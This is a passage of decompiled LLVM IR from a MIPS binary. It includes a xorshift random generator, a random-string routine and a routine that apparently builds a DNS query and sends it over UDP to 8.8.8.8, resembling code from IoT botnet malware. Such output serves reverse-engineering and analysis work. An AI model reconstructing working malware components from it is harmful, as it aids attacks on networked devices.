  %v3_4028c0 = load i32, i32* %v2_4028c0, align 4
  %v1_4028c8 = add i32 %v3_4028c0, 7396
  call void @__pseudo_call(i32 %v1_4028c8)
  %v0_4028dc.pre = load i32, i32* @gp, align 4
  br label %dec_label_pc_4028dc

dec_label_pc_4028dc:                              ; preds = %dec_label_pc_4028b8.thread, %dec_label_pc_4028b8, %dec_label_pc_4028c0
  %v0_4028dc = phi i32 [ %v2_401f8c, %dec_label_pc_4028b8 ], [ %v0_4028dc.pre, %dec_label_pc_4028c0 ], [ %v2_401f8c, %dec_label_pc_4028b8.thread ]
  %v1_4028dc = add i32 %v0_4028dc, -32036
  %v2_4028dc = inttoptr i32 %v1_4028dc to i32*
  %v3_4028dc = load i32, i32* %v2_4028dc, align 4
  store i32 2, i32* %a2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_4028f0.218 to i32), i32* @ra, align 4
  store i32 16384, i32* %a3.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4028dc)
  %v3_4028f0 = load i16, i16* %stack_var_-1000, align 2
  %v4_4028f0 = sext i16 %v3_4028f0 to i32
  %v1_4028f8 = mul nsw i32 %v4_4028f0, 256
  %v1_4028fc = and i32 %v1_4028f8, 65280
  store i32 %v1_4028fc, i32* %v0.global-to-local, align 4
  %v1_402900 = udiv i32 %v4_4028f0, 256
  %v2_402904 = or i32 %v1_4028fc, %v1_402900
  %v3_402904 = trunc i32 %v2_402904 to i16
  store i32 %v2_402904, i32* %a2.global-to-local, align 4
  %v3_402908 = load i32, i32* @global_var_4494ac.216, align 4
  store i32 %v3_402908, i32* @t9, align 4
  %v0_40290c = load i32, i32* @s3, align 4
  %v1_40290c = add i32 %v0_40290c, -28632
  %v2_40290c = inttoptr i32 %v1_40290c to i32*
  %v3_40290c = load i32, i32* %v2_40290c, align 4
  %v0_402910 = load i32, i32* @s0, align 4
  store i32 %v0_402910, i32* %a1.global-to-local, align 4
  store i16 %v3_402904, i16* %stack_var_-1000, align 2
  store i32 16384, i32* %a3.global-to-local, align 4
  %v8_402918 = inttoptr i32 %v0_402910 to i32*
  %v9_402918 = call i32 @function_4059a0(i32 %v3_40290c, i32* %v8_402918, i32 %v2_402904, i32 16384)
  %v3_402920 = load i16, i16* %stack_var_-1000, align 2
  %v4_402920 = sext i16 %v3_402920 to i32
  store i32 %v4_402920, i32* %a1.global-to-local, align 4
  store i32 %v2_401f8c, i32* @gp, align 4
  store i32 4, i32* %v0.global-to-local, align 4
  switch i16 %v3_402920, label %dec_label_pc_402938 [
    i16 263, label %dec_label_pc_40242c
    i16 0, label %dec_label_pc_40242c
  ]

dec_label_pc_402938:                              ; preds = %dec_label_pc_4028dc
  %v3_40293c = load i32, i32* @global_var_4494c0.219, align 4
  store i32 %v3_40293c, i32* @t9, align 4
  %v1_402944 = load i32, i32* @s0, align 4
  %v4_402944 = inttoptr i32 %v1_402944 to i32*
  %v5_402944 = call i32 @function_400624(i32* %v4_402944, i32 %v4_402920)
  store i32 %v5_402944, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_402954

dec_label_pc_402954:                              ; preds = %dec_label_pc_40217c, %dec_label_pc_402938
  %v4_402970 = phi i32 [ 0, %dec_label_pc_40217c ], [ %v5_402944, %dec_label_pc_402938 ]
  store i32 %v0_401fa8, i32* %s1.global-to-local, align 4
  ret i32 %v4_402970

; uselistorder directives
  uselistorder i32 %v2_402904, { 0, 2, 1 }
  uselistorder i32 %v4_4028f0, { 1, 0 }
  uselistorder i32 %v2_402860, { 1, 0 }
  uselistorder i32 %v1_40285c, { 1, 0 }
  uselistorder i32 %v3_402830, { 1, 0 }
  uselistorder i32 %v4_402828, { 1, 0, 2 }
  uselistorder i32 %v3_4027a8, { 1, 2, 0, 3 }
  uselistorder i32 %v3_40271c, { 1, 2, 0 }
  uselistorder i32 %v3_402638, { 1, 0, 2 }
  uselistorder i32 %v3_4025ec, { 1, 0, 2 }
  uselistorder i32 %v1_402454, { 1, 2, 0 }
  uselistorder i32 %v1_402440, { 0, 2, 3, 1 }
  uselistorder i32 %v4_4025e4, { 5, 2, 4, 6, 0, 7, 3, 1 }
  uselistorder i32 %v2_402434, { 1, 0, 2 }
  uselistorder i32 %v3_402364, { 1, 0 }
  uselistorder i32 %v3_402338, { 1, 0, 2 }
  uselistorder i32 %v3_40232c, { 1, 0, 2 }
  uselistorder i32 %v5_4022a4, { 1, 0, 2 }
  uselistorder i32 %v3_402120, { 1, 0, 2 }
  uselistorder i32 %v3_402014, { 1, 0, 2 }
  uselistorder i32 %v2_401f8c, { 12, 5, 6, 0, 1, 2, 3, 4, 16, 15, 14, 13, 11, 10, 7, 17, 9, 8 }
  uselistorder i32* %stack_var_-932, { 1, 0 }
  uselistorder i32* %stack_var_-900, { 1, 0 }
  uselistorder i32* %stack_var_-980, { 1, 0, 2 }
  uselistorder i16* %stack_var_-1000, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-996, { 1, 0, 2, 3 }
  uselistorder i32* %v0.global-to-local, { 3, 2, 4, 5, 7, 6, 9, 8, 16, 11, 10, 12, 14, 13, 15, 17, 18, 19, 20, 21, 22, 23, 1, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 54, 53, 55, 56, 58, 57, 59, 60, 61, 62, 64, 63, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 77, 76, 78, 79, 80, 0 }
  uselistorder i32* %a1.global-to-local, { 2, 3, 4, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32 16386, { 1, 2, 0, 3 }
  uselistorder i8* @global_var_449514.157, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_404e10, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_405c40, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_404550, { 1, 0 }
  uselistorder label %dec_label_pc_402954, { 1, 0 }
  uselistorder label %dec_label_pc_4028dc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_4028c0, { 2, 0, 1, 4, 3, 5 }
  uselistorder label %dec_label_pc_402858, { 1, 0 }
  uselistorder label %dec_label_pc_4026f8, { 1, 0 }
  uselistorder label %dec_label_pc_402638, { 1, 0 }
  uselistorder label %dec_label_pc_402630, { 1, 0 }
  uselistorder label %dec_label_pc_4025d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_402544, { 1, 0 }
  uselistorder label %dec_label_pc_4024e8, { 1, 0 }
  uselistorder label %dec_label_pc_40242c, { 1, 0, 3, 4, 5, 2, 6 }
  uselistorder label %dec_label_pc_4023f8, { 1, 0 }
  uselistorder label %dec_label_pc_402304, { 1, 0 }
  uselistorder label %dec_label_pc_4022d8, { 1, 0 }
  uselistorder label %dec_label_pc_40217c, { 1, 0 }
  uselistorder label %dec_label_pc_402064, { 1, 0 }
}

define i32 @function_402978() local_unnamed_addr {
dec_label_pc_402978:
  %v3_402984 = load i32, i32* @global_var_4491e8.9, align 4
  %v3_40298c = load i32, i32* @global_var_44951c.220, align 4
  %v3_402990 = load i32, i32* @global_var_449528.221, align 4
  store i32 %v3_402984, i32* @a3, align 4
  %v1_40299c = mul i32 %v3_40298c, 2048
  %v1_4029a0 = udiv i32 %v3_402990, 524288
  %v2_4029a4 = xor i32 %v1_40299c, %v3_40298c
  %v2_4029a8 = xor i32 %v1_4029a0, %v3_402990
  %v2_4029ac = xor i32 %v2_4029a8, %v2_4029a4
  %v3_4029b0 = load i32, i32* @global_var_449520.222, align 4
  %v3_4029b4 = load i32, i32* @global_var_449524.223, align 4
  store i32 %v3_4029b4, i32* @a2, align 4
  %v1_4029b8 = udiv i32 %v2_4029a4, 256
  %v2_4029bc = xor i32 %v2_4029ac, %v1_4029b8
  store i32 %v3_4029b0, i32* @global_var_44951c.220, align 4
  store i32 %v3_4029b4, i32* @global_var_449520.222, align 4
  store i32 %v3_402990, i32* @global_var_449524.223, align 4
  store i32 %v2_4029bc, i32* @global_var_449528.221, align 4
  ret i32 %v2_4029bc

; uselistorder directives
  uselistorder i32 %v2_4029bc, { 1, 0 }
  uselistorder i32 %v3_402990, { 2, 1, 0 }
  uselistorder i32 %v3_40298c, { 1, 0 }
}

define i32 @function_4029d4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4029d4:
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_4029e8 = load i32, i32* @s3, align 4
  store i32 %tmp, i32* %s2.global-to-local, align 4
  store i32 %arg2, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_402a08

dec_label_pc_402a08:                              ; preds = %dec_label_pc_402a08, %dec_label_pc_4029d4
  %v1_402a08 = call i32 @function_402978()
  store i32 %v1_402a08, i32* @v0, align 4
  %v0_402a14 = load i32, i32* @s3, align 4
  %v1_402a14 = add i32 %v0_402a14, -28628
  %v3_402a20 = call i32 @function_40434c(i32 %v1_402a14)
  %v5_402a28 = urem i32 %v1_402a08, %v3_402a20
  %v0_402a34 = load i32, i32* @s3, align 4
  %v1_402a34 = add i32 %v0_402a34, -28628
  %v2_402a40 = add i32 %v1_402a34, %v5_402a28
  %v1_402a44 = inttoptr i32 %v2_402a40 to i8*
  %v2_402a44 = load i8, i8* %v1_402a44, align 1
  %v2_402a4c = load i32, i32* %s2.global-to-local, align 4
  %v3_402a4c = inttoptr i32 %v2_402a4c to i8*
  store i8 %v2_402a44, i8* %v3_402a4c, align 1
  %v0_402a50 = load i32, i32* %s2.global-to-local, align 4
  %v1_402a50 = add i32 %v0_402a50, 1
  store i32 %v1_402a50, i32* %s2.global-to-local, align 4
  %v0_402a54 = load i32, i32* %s1.global-to-local, align 4
  %v1_402a54 = add i32 %v0_402a54, -1
  store i32 %v1_402a54, i32* %s1.global-to-local, align 4
  %v3_402a5c = load i32, i32* @global_var_449414.195, align 4
  store i32 %v3_402a5c, i32* @t9, align 4
  %v3_402a60 = load i32, i32* @global_var_4491e8.9, align 4
  store i32 %v3_402a60, i32* @s3, align 4
  %v2_402a64 = icmp eq i32 %v0_402a54, 0
  br i1 %v2_402a64, label %dec_label_pc_402a68, label %dec_label_pc_402a08

dec_label_pc_402a68:                              ; preds = %dec_label_pc_402a08
  store i32 %v0_4029e8, i32* @s3, align 4
  ret i32 -1
}

define i32 @function_402a88() local_unnamed_addr {
dec_label_pc_402a88:
  %v0_402aa0 = load i32, i32* @s0, align 4
  %v3_402aa8 = load i32, i32* @global_var_449340.224, align 4
  store i32 %v3_402aa8, i32* @t9, align 4
  %v3_402ab0 = call i32 @function_4050e0(i32* null)
  %v3_402ac4 = load i32, i32* @global_var_449484.225, align 4
  store i32 %v3_402ac4, i32* @t9, align 4
  store i32 %v3_402ab0, i32* @global_var_44951c.220, align 4
  %v5_402acc = call i32 @function_404bd0()
  %v3_402adc = load i32, i32* @global_var_449348.6, align 4
  store i32 %v3_402adc, i32* @t9, align 4
  store i32 %v5_402acc, i32* @s0, align 4
  %v2_402ae4 = call i32 @function_404c30()
  %v0_402af0 = load i32, i32* @s0, align 4
  %v2_402af0 = xor i32 %v0_402af0, %v2_402ae4
  %v3_402af4 = load i32, i32* @global_var_4492b0.226, align 4
  store i32 %v3_402af4, i32* @t9, align 4
  store i32 %v2_402af0, i32* @global_var_449520.222, align 4
  %v5_402afc = call i32 @function_4055f0()
  %v3_402b08 = load i32, i32* @global_var_449520.222, align 4
  %v2_402b10 = xor i32 %v3_402b08, %v5_402afc
  store i32 %v2_402b10, i32* @global_var_449528.221, align 4
  store i32 %v5_402afc, i32* @global_var_449524.223, align 4
  store i32 %v0_402aa0, i32* @s0, align 4
  ret i32 %v5_402afc

; uselistorder directives
  uselistorder i32 %v5_402afc, { 1, 2, 0 }
  uselistorder i32 ()* @function_404c30, { 1, 0 }
}

define i32 @function_402b38(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_402b38:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %a3.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  %s4.global-to-local = alloca i32, align 4
  %s6.global-to-local = alloca i32, align 4
  %s7.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %a1.global-to-local, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp30 = call i8 @__decompiler_undefined_function_1()
  %tmp31 = call i8 @__decompiler_undefined_function_1()
  %tmp32 = call i8 @__decompiler_undefined_function_1()
  %tmp33 = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_2()
  %tmp35 = call i16 @__decompiler_undefined_function_2()
  %stack_var_-2075 = alloca i8, align 1
  %stack_var_-2065 = alloca i32, align 4
  %stack_var_-2077 = alloca i32, align 4
  %stack_var_-2082 = alloca i32, align 4
  %stack_var_-2084 = alloca i32, align 4
  %stack_var_-2096 = alloca i16, align 2
  %stack_var_-4296 = alloca i32, align 4
  %stack_var_-4272 = alloca i32, align 4
  %stack_var_-4288 = alloca i32, align 4
  %stack_var_-4144 = alloca i32, align 4
  %stack_var_-4132 = alloca i32, align 4
  %v1_402b40 = load i32, i32* @t9, align 4
  %v2_402b40 = add i32 %v1_402b40, 321176
  store i32 %v2_402b40, i32* %gp.global-to-local, align 4
  %v0_402b4c = load i32, i32* @fp, align 4
  %v0_402b6c = load i32, i32* @s0, align 4
  %v3_402b74 = load i32, i32* @global_var_4493f0.14, align 4
  store i32 %v3_402b74, i32* @t9, align 4
  store i32 %arg1, i32* @s0, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  store i32 262, i32* %a1.global-to-local, align 4
  %v4_402b88 = call i32 @function_405fc0(i64 1, i32 262)
  store i32 %v4_402b88, i32* @v0, align 4
  store i32 %v2_402b40, i32* %gp.global-to-local, align 4
  %v0_402b94 = load i32, i32* @s0, align 4
  store i32 %v0_402b94, i32* %a0.global-to-local, align 4
  store i32 %v4_402b88, i32* %s3.global-to-local, align 4
  %v3_402ba0 = call i32 @function_40434c(i32 %v0_402b94)
  store i32 %v3_402ba0, i32* %v0.global-to-local, align 4
  store i32 %v2_402b40, i32* %gp.global-to-local, align 4
  store i32 %v3_402ba0, i32* %s1.global-to-local, align 4
  %v3_402bb0 = load i32, i32* @global_var_449324.227, align 4
  store i32 %v3_402bb0, i32* @t9, align 4
  %v3_402bb8 = ptrtoint i32* %stack_var_-4132 to i32
  store i32 %v3_402bb8, i32* %s4.global-to-local, align 4
  %v4_402bb8 = call i32 @function_4047d4()
  store i32 %v4_402bb8, i32* %v0.global-to-local, align 4
  store i32 %v2_402b40, i32* %gp.global-to-local, align 4
  %v2_402bc4 = ptrtoint i32* %stack_var_-4144 to i32
  store i32 %v3_402bb8, i32* %a3.global-to-local, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 46, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_402bdc

dec_label_pc_402bdc:                              ; preds = %dec_label_pc_402c20.dec_label_pc_402bdc_crit_edge, %dec_label_pc_402b38
  %v2_402bec = phi i32 [ %v2_402bec10, %dec_label_pc_402c20.dec_label_pc_402bdc_crit_edge ], [ %v3_402bb8, %dec_label_pc_402b38 ]
  %v4_402be4 = phi i32 [ %v4_402be48, %dec_label_pc_402c20.dec_label_pc_402bdc_crit_edge ], [ 0, %dec_label_pc_402b38 ]
  %v3_402be4 = phi i32 [ %v1_402c20, %dec_label_pc_402c20.dec_label_pc_402bdc_crit_edge ], [ 0, %dec_label_pc_402b38 ]
  %v1_402be4 = phi i32 [ %v1_402be4.pre, %dec_label_pc_402c20.dec_label_pc_402bdc_crit_edge ], [ 46, %dec_label_pc_402b38 ]
  %v0_402bdc = phi i32 [ %v4_402c28, %dec_label_pc_402c20.dec_label_pc_402bdc_crit_edge ], [ %v4_402bb8, %dec_label_pc_402b38 ]
  %v1_402bdc = inttoptr i32 %v0_402bdc to i8*
  %v2_402bdc = load i8, i8* %v1_402bdc, align 1
  %v3_402bdc = sext i8 %v2_402bdc to i32
  %v2_402be4 = icmp eq i32 %v3_402bdc, %v1_402be4
  %v5_402be4 = sub i32 %v3_402be4, %v4_402be4
  store i32 %v5_402be4, i32* %v0.global-to-local, align 4
  br i1 %v2_402be4, label %dec_label_pc_402be8, label %dec_label_pc_402c20

dec_label_pc_402be8:                              ; preds = %dec_label_pc_402bdc
  %v1_402bec = trunc i32 %v5_402be4 to i8
  %v3_402bec = inttoptr i32 %v2_402bec to i8*
  store i8 %v1_402bec, i8* %v3_402bec, align 1
  %v0_402bf0 = load i32, i32* @s0, align 4
  %v1_402bf0 = load i32, i32* %a1.global-to-local, align 4
  %v2_402bf0 = add i32 %v1_402bf0, %v0_402bf0
  store i32 %v2_402bf0, i32* %a0.global-to-local, align 4
  %v0_402bf8 = load i32, i32* %a3.global-to-local, align 4
  %v1_402bf8 = add i32 %v0_402bf8, 1
  store i32 %v1_402bf8, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_402bfc

dec_label_pc_402bfc:                              ; preds = %dec_label_pc_402bfc, %dec_label_pc_402be8
  %v2_402c04 = phi i32 [ %v1_402c08, %dec_label_pc_402bfc ], [ %v1_402bf8, %dec_label_pc_402be8 ]
  %v0_402bfc = phi i32 [ %v1_402c14, %dec_label_pc_402bfc ], [ %v2_402bf0, %dec_label_pc_402be8 ]
  %v1_402bfc = add i32 %v0_402bfc, -1
  %v2_402bfc = inttoptr i32 %v1_402bfc to i8*
  %v3_402bfc = load i8, i8* %v2_402bfc, align 1
  %v3_402c04 = inttoptr i32 %v2_402c04 to i8*
  store i8 %v3_402bfc, i8* %v3_402c04, align 1
  %v0_402c08 = load i32, i32* %a3.global-to-local, align 4
  %v1_402c08 = add i32 %v0_402c08, 1
  store i32 %v1_402c08, i32* %a3.global-to-local, align 4
  %v0_402c0c = load i32, i32* %a1.global-to-local, align 4
  %v1_402c0c = load i32, i32* %a2.global-to-local, align 4
  %v2_402c0c = icmp slt i32 %v0_402c0c, %v1_402c0c
  %v3_402c0c = zext i1 %v2_402c0c to i32
  store i32 %v3_402c0c, i32* %v0.global-to-local, align 4
  %v1_402c10 = add i32 %v0_402c0c, 1
  store i32 %v1_402c10, i32* %v1.global-to-local, align 4
  %v0_402c14 = load i32, i32* %a0.global-to-local, align 4
  %v1_402c14 = add i32 %v0_402c14, 1
  store i32 %v1_402c14, i32* %a0.global-to-local, align 4
  store i32 %v1_402c10, i32* %a1.global-to-local, align 4
  br i1 %v2_402c0c, label %dec_label_pc_402bfc, label %dec_label_pc_402c20

dec_label_pc_402c20:                              ; preds = %dec_label_pc_402bfc, %dec_label_pc_402bdc
  %v0_402c20 = phi i32 [ %v3_402be4, %dec_label_pc_402bdc ], [ %v1_402c0c, %dec_label_pc_402bfc ]
  %v2_402bec10 = phi i32 [ %v2_402bec, %dec_label_pc_402bdc ], [ %v1_402c08, %dec_label_pc_402bfc ]
  %v4_402be48 = phi i32 [ %v4_402be4, %dec_label_pc_402bdc ], [ %v1_402c10, %dec_label_pc_402bfc ]
  %v1_402c20 = add i32 %v0_402c20, 1
  store i32 %v1_402c20, i32* %a2.global-to-local, align 4
  %v1_402c24 = load i32, i32* %s1.global-to-local, align 4
  %v2_402c24 = icmp slt i32 %v1_402c20, %v1_402c24
  %v2_402c28 = load i32, i32* @s0, align 4
  %v4_402c28 = add i32 %v2_402c28, %v1_402c20
  store i32 %v4_402c28, i32* %v0.global-to-local, align 4
  br i1 %v2_402c24, label %dec_label_pc_402c20.dec_label_pc_402bdc_crit_edge, label %dec_label_pc_402c2c

dec_label_pc_402c20.dec_label_pc_402bdc_crit_edge: ; preds = %dec_label_pc_402c20
  %v1_402be4.pre = load i32, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_402bdc

dec_label_pc_402c2c:                              ; preds = %dec_label_pc_402c20
  %v1_402b78 = urem i32 %arg2, 256
  %v3_402c30 = load i32, i32* @global_var_449414.195, align 4
  store i32 %v3_402c30, i32* @t9, align 4
  store i32 %v3_402bb8, i32* %v0.global-to-local, align 4
  store i32 0, i32* %stack_var_-4132, align 4
  %v4_402c38 = call i32 @function_402978()
  %v5_402c38 = sext i32 %v4_402c38 to i64
  %v5_402c48 = mul nuw nsw i64 %v5_402c38, 2147516417
  store i32 %v2_402b40, i32* %gp.global-to-local, align 4
  store i32 %v3_402bb8, i32* %a0.global-to-local, align 4
  store i32 -1, i32* %s2.global-to-local, align 4
  store i32 1, i32* %s6.global-to-local, align 4
  %v1_402c6426 = udiv i64 %v5_402c48, 140737488355328
  %v1_402c64 = trunc i64 %v1_402c6426 to i32
  store i32 %v1_402c64, i32* %v1.global-to-local, align 4
  %v3_402c68 = add i32 %v1_402c64, %v4_402c38
  store i32 %v3_402c68, i32* @v0, align 4
  %v2_402c6c = urem i32 %v3_402c68, 65536
  store i32 %v2_402c6c, i32* @fp, align 4
  %v4_402c6c = call i32 @function_40434c(i32 %v3_402bb8)
  store i32 %v4_402c6c, i32* @v0, align 4
  store i32 %v2_402b40, i32* %gp.global-to-local, align 4
  store i32 %v3_402bb8, i32* %a0.global-to-local, align 4
  %v2_402c84 = add i32 %v4_402c6c, 17
  store i32 %v2_402c84, i32* %s7.global-to-local, align 4
  %v4_402c84 = call i32 @function_40434c(i32 %v3_402bb8)
  store i32 %v2_402b40, i32* %gp.global-to-local, align 4
  %v1_402c94 = mul nuw nsw i32 %v1_402b78, 256
  store i32 %v1_402c94, i32* %a1.global-to-local, align 4
  store i32 2, i32* %stack_var_-4288, align 4
  %v0_402cb4 = load i32, i32* %s4.global-to-local, align 4
  %v2_402cb4 = add i32 %v0_402cb4, %v4_402c84
  store i32 %v2_402cb4, i32* %v0.global-to-local, align 4
  store i32 256, i32* %a0.global-to-local, align 4
  store i32 134744072, i32* %v1.global-to-local, align 4
  %v0_402cc4 = load i32, i32* @fp, align 4
  store i32 %v0_402cc4, i32* %stack_var_-4144, align 4
  %v3_402ccc = add i32 %v2_402cb4, 3
  %v4_402ccc = inttoptr i32 %v3_402ccc to i16*
  store i16 256, i16* %v4_402ccc, align 2
  %v0_402cd0 = load i32, i32* %a1.global-to-local, align 4
  %v1_402cd0 = trunc i32 %v0_402cd0 to i16
  %v2_402cd0 = load i32, i32* %v0.global-to-local, align 4
  %v3_402cd0 = add i32 %v2_402cd0, 1
  %v4_402cd0 = inttoptr i32 %v3_402cd0 to i16*
  store i16 %v1_402cd0, i16* %v4_402cd0, align 2
  store i32 -1, i32* @s0, align 4
  %v0_402cd8 = load i32, i32* %s2.global-to-local, align 4
  %v2_402cd8 = icmp eq i32 %v0_402cd8, -1
  br i1 %v2_402cd8, label %dec_label_pc_402cf8, label %dec_label_pc_402cdc

dec_label_pc_402cdc:                              ; preds = %dec_label_pc_402c2c
  %v3_402ce0 = load i32, i32* @global_var_44928c.154, align 4
  store i32 %v3_402ce0, i32* @t9, align 4
  store i32 %v0_402cd8, i32* %a0.global-to-local, align 4
  %v3_402ce8 = call i32 @function_404b10(i32 %v0_402cd8)
  store i32 %v3_402ce8, i32* %v0.global-to-local, align 4
  store i32 %v2_402b40, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_402cf8

dec_label_pc_402cf8:                              ; preds = %dec_label_pc_402c2c, %dec_label_pc_402cdc
  %v3_402cf8 = load i32, i32* @global_var_449444.206, align 4
  store i32 %v3_402cf8, i32* @t9, align 4
  store i32 2, i32* %a0.global-to-local, align 4
  store i32 1, i32* %a1.global-to-local, align 4
  store i32 0, i32* @a2, align 4
  %v4_402d04 = call i32 @function_405be0(i32 2, i32 1)
  store i32 %v4_402d04, i32* %v0.global-to-local, align 4
  store i32 %v2_402b40, i32* %gp.global-to-local, align 4
  %v1_402d10 = load i32, i32* @s0, align 4
  %v2_402d10 = icmp eq i32 %v4_402d04, %v1_402d10
  store i32 %v4_402d04, i32* %s2.global-to-local, align 4
  br i1 %v2_402d10, label %dec_label_pc_402d58, label %dec_label_pc_402d14

dec_label_pc_402d14:                              ; preds = %dec_label_pc_402cf8
  %v3_402d18 = load i32, i32* @global_var_4494a8.209, align 4
  store i32 %v3_402d18, i32* @t9, align 4
  store i32 %v4_402d04, i32* %a0.global-to-local, align 4
  %v2_402d20 = ptrtoint i32* %stack_var_-4288 to i32
  store i32 %v2_402d20, i32* %a1.global-to-local, align 4
  store i32 16, i32* %a2.global-to-local, align 4
  %v4_402d24 = bitcast i32* %stack_var_-4288 to %sockaddr*
  %v5_402d24 = call i32 @function_405800(i32 %v4_402d04, %sockaddr* %v4_402d24, i32 16)
  store i32 %v5_402d24, i32* %v0.global-to-local, align 4
  store i32 %v2_402b40, i32* %gp.global-to-local, align 4
  %v1_402d30 = load i32, i32* @s0, align 4
  %v2_402d30 = icmp eq i32 %v5_402d24, %v1_402d30
  %v3_402d30 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v3_402d30, i32* %a0.global-to-local, align 4
  br i1 %v2_402d30, label %dec_label_pc_402d58, label %dec_label_pc_402d34

dec_label_pc_402d34:                              ; preds = %dec_label_pc_402d14
  %v3_402d38 = load i32, i32* @global_var_449420.211, align 4
  store i32 %v3_402d38, i32* @t9, align 4
  store i32 %v2_402bc4, i32* %a1.global-to-local, align 4
  %v0_402d40 = load i32, i32* %s7.global-to-local, align 4
  store i32 %v0_402d40, i32* %a2.global-to-local, align 4
  store i32 16384, i32* %a3.global-to-local, align 4
  %v6_402d44 = call i32 @function_405a80(i32 %v3_402d30, i32* nonnull %stack_var_-4144, i32 %v0_402d40, i32 16384)
  store i32 %v6_402d44, i32* %v0.global-to-local, align 4
  store i32 %v2_402b40, i32* %gp.global-to-local, align 4
  %v2_402d50 = icmp eq i32 %v6_402d44, %v0_402d40
  store i32 3, i32* @a1, align 4
  br i1 %v2_402d50, label %dec_label_pc_402d74, label %dec_label_pc_402d58

dec_label_pc_402d58:                              ; preds = %dec_label_pc_402d34, %dec_label_pc_402d14, %dec_label_pc_402cf8
  %v1_402d58 = add i32 %v1_402b40, 289052
  %v2_402d58 = inttoptr i32 %v1_402d58 to i32*
  %v3_402d58 = load i32, i32* %v2_402d58, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_402d58)
  store i32 %v2_402b40, i32* %gp.global-to-local, align 4
  %v0_402d70 = load i32, i32* %s6.global-to-local, align 4
  %v1_402d70 = add i32 %v0_402d70, 1
  store i32 %v1_402d70, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_402d74

dec_label_pc_402d74:                              ; preds = %dec_label_pc_402d34, %dec_label_pc_402d58
  %v3_402d74 = load i32, i32* @global_var_449294.208, align 4
  store i32 %v3_402d74, i32* @t9, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  %v1_402d7c = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_402d7c, i32* @a0, align 4
  %v2_402d7c = call i32 @function_4049b0()
  store i32 %v2_402d7c, i32* %v0.global-to-local, align 4
  store i32 %v2_402b40, i32* %gp.global-to-local, align 4
  store i32 4, i32* @a1, align 4
  %v3_402d8c = load i32, i32* @global_var_449294.208, align 4
  store i32 %v3_402d8c, i32* @t9, align 4
  %v0_402d90 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v0_402d90, i32* @a0, align 4
  %v2_402d94 = or i32 %v2_402d7c, 128
  store i32 %v2_402d94, i32* %a2.global-to-local, align 4
  %v3_402d94 = call i32 @function_4049b0()
  %v2_402d9c = ptrtoint i32* %stack_var_-4272 to i32
  store i32 %v2_402d9c, i32* %a1.global-to-local, align 4
  store i32 %v2_402b40, i32* %gp.global-to-local, align 4
  store i32 %v2_402d9c, i32* %v0.global-to-local, align 4
  store i32 %v2_402bc4, i32* %v1.global-to-local, align 4
  %v5_402db4 = ptrtoint i32* %stack_var_-4296 to i32
  br label %dec_label_pc_402dac

dec_label_pc_402dac:                              ; preds = %dec_label_pc_402dac, %dec_label_pc_402d74
  %v0_402dac = phi i32 [ %v1_402db0, %dec_label_pc_402dac ], [ %v2_402d9c, %dec_label_pc_402d74 ]
  %v1_402dac = inttoptr i32 %v0_402dac to i32*
  store i32 0, i32* %v1_402dac, align 4
  %v0_402db0 = load i32, i32* %v0.global-to-local, align 4
  %v1_402db0 = add i32 %v0_402db0, 4
  store i32 %v1_402db0, i32* %v0.global-to-local, align 4
  %v1_402db4 = load i32, i32* %v1.global-to-local, align 4
  %v2_402db4 = icmp eq i32 %v1_402db0, %v1_402db4
  store i32 %v5_402db4, i32* %a0.global-to-local, align 4
  br i1 %v2_402db4, label %dec_label_pc_402db8, label %dec_label_pc_402dac

dec_label_pc_402db8:                              ; preds = %dec_label_pc_402dac
  %v0_402dbc = load i32, i32* %s2.global-to-local, align 4
  %v1_402dbc = udiv i32 %v0_402dbc, 32
  %v1_402dc0 = mul nuw nsw i32 %v1_402dbc, 4
  store i32 %v1_402dc0, i32* %v0.global-to-local, align 4
  %v2_402dc4 = add i32 %v1_402dc0, %v5_402db4
  store i32 %v2_402dc4, i32* @s0, align 4
  %v1_402dc8 = add i32 %v2_402dc4, 24
  %v2_402dc8 = inttoptr i32 %v1_402dc8 to i32*
